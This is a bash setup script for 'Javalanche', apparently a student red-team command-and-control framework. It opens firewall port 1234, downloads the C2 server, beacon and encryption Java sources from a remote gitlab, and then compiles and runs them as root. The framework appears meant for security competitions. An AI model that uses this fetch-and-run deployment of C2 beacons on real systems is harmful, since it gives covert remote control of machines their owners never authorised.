#!/bin/bash

# Get command line parameters
server="C2"

if [ "$1" == "-server" ]; then
    server="$2"
fi
if [ "$3" == "-server" ]; then
    server="$4"
fi

# Default branch is main, -branch parameter will pull from a different branch
branch="main"
if [ "$1" == "-branch" ]; then
    branch="$2"
fi
if [ "$3" == "-branch" ]; then
    branch="$4"
fi


if [ ! -f "/home/javalanche/jdkinstaller.tar" ]; then
    # install Java development kit
    sudo curl -o /home/javalanche/jdkinstaller.tar.gz https://download.oracle.com/java/24/latest/jdk-24_linux-x64_bin.tar.gz > /dev/null
    sudo gzip -d /home/javalanche/jdkinstaller.tar.gz
    sudo tar -xf /home/javalanche/jdkinstaller.tar -C /home/javalanche
fi

jdkDir=$(ls /home/javalanche | grep jdk-)
javaDir="/home/javalanche/$jdkDir/bin/java"
javacDir="/home/javalanche/$jdkDir/bin/javac"


# set firewall rules
if [ "$server" == "C2" ]; then
    sudo iptables -A INPUT -p tcp --dport 1234 -j ACCEPT
else
    sudo iptables -A OUTPUT -p tcp --dport 1234 -j ACCEPT
    sudo iptables -A INPUT -p tcp --dport http -j ACCEPT
fi

# set up directories
if [ ! -d "/home/javalanche/Servers" ]; then
    sudo mkdir /home/javalanche/Servers
fi
if [ ! -d "/home/javalanche/Servers/Beacon" ]; then
    sudo mkdir /home/javalanche/Servers/Beacon
fi
if [ ! -d "/home/javalanche/Servers/C2" ]; then
    sudo mkdir /home/javalanche/Servers/C2
fi
if [ ! -d "/home/javalanche/Servers/encryption" ]; then
    sudo mkdir /home/javalanche/Servers/encryption
fi
if [ ! -d "/home/javalanche/Servers/encryption/aes" ]; then
    sudo mkdir /home/javalanche/Servers/encryption/aes
fi
if [ ! -d "/home/javalanche/Servers/encryption/rot13" ]; then
    sudo mkdir /home/javalanche/Servers/encryption/rot13
fi
if [ ! -d "/home/javalanche/Servers/encryption/rsa" ]; then
    sudo mkdir /home/javalanche/Servers/encryption/rsa
fi

# Download all of the java files
sudo curl -o /home/javalanche/Servers/C2/C2Server.java https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/$branch/Servers/C2/C2Server.java?ref_type=heads
sudo curl -o /home/javalanche/Servers/C2/C2ServerUserHandler.java https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/$branch/Servers/C2/C2ServerUserHandler.java?ref_type=heads
sudo curl -o /home/javalanche/Servers/C2/C2ServerBeaconHandler.java https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/$branch/Servers/C2/C2ServerBeaconHandler.java?ref_type=heads
sudo curl -o /home/javalanche/Servers/C2/C2ServerAPI.java https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/$branch/Servers/C2/C2ServerAPI.java?ref_type=heads
sudo curl -o /home/javalanche/Servers/Beacon/BeaconServer.java https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/$branch/Servers/Beacon/BeaconServer.java?ref_type=heads
sudo curl -o /home/javalanche/Servers/Beacon/BeaconClientHandler.java https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/$branch/Servers/Beacon/BeaconClientHandler.java?ref_type=heads
sudo curl -o /home/javalanche/Servers/Beacon/BeaconC2Handler.java https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/$branch/Servers/Beacon/BeaconC2Handler.java?ref_type=heads
sudo curl -o /home/javalanche/Servers/Beacon/pwnBoardRequest.java https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/$branch/Servers/Beacon/pwnBoardRequest.java?ref_type=heads
sudo curl -o /home/javalanche/Servers/Duplexer.java https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/$branch/Servers/Duplexer.java?ref_type=heads
sudo curl -o /home/javalanche/Servers/keepAlive.java https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/$branch/Servers/keepAlive.java?ref_type=heads
sudo curl -o /home/javalanche/Servers/notifyLock.java https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/$branch/Servers/notifyLock.java?ref_type=heads
sudo curl -o /home/javalanche/Servers/json.jar https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/$branch/Servers/json.jar?ref_type=heads
sudo curl -o /home/javalanche/Servers/encryption/aes/aes.java https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/$branch/Servers/encryption/aes/aes.java?ref_type=heads
sudo curl -o /home/javalanche/Servers/encryption/aes/encryption.java https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/$branch/Servers/encryption/aes/encryption.java?ref_type=heads
sudo curl -o /home/javalanche/Servers/encryption/aes/decryption.java https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/$branch/Servers/encryption/aes/decryption.java?ref_type=heads
sudo curl -o /home/javalanche/Servers/encryption/aes/modes.java https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/$branch/Servers/encryption/aes/modes.java?ref_type=heads
sudo curl -o /home/javalanche/Servers/encryption/aes/keyExpansion.java https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/$branch/Servers/encryption/aes/keyExpansion.java?ref_type=heads
sudo curl -o /home/javalanche/Servers/encryption/rot13/rot13.java https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/$branch/Servers/encryption/rot13/rot13.java?ref_type=heads
sudo curl -o /home/javalanche/Servers/encryption/rsa/rsa.java https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/$branch/Servers/encryption/rsa/rsa.java?ref_type=heads

# Download file for javac to use
sudo curl -o /home/javalanche/files.txt https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/$branch/Setup/linuxFiles.txt?ref_type=heads

# Compile
sudo "$javacDir" -cp /home/javalanche/Servers/json.jar "@/home/javalanche/files.txt"

# Run the desired server
if [ "$server" == "C2" ]; then
    sudo "$javaDir" -cp /home/javalanche/Servers/json.jar:/home/javalanche/ Servers.C2.C2Server
else
    sudo "$javaDir" -cp /home/javalanche/Servers/json.jar:/home/javalanche/ Servers.Beacon.BeaconServer
fi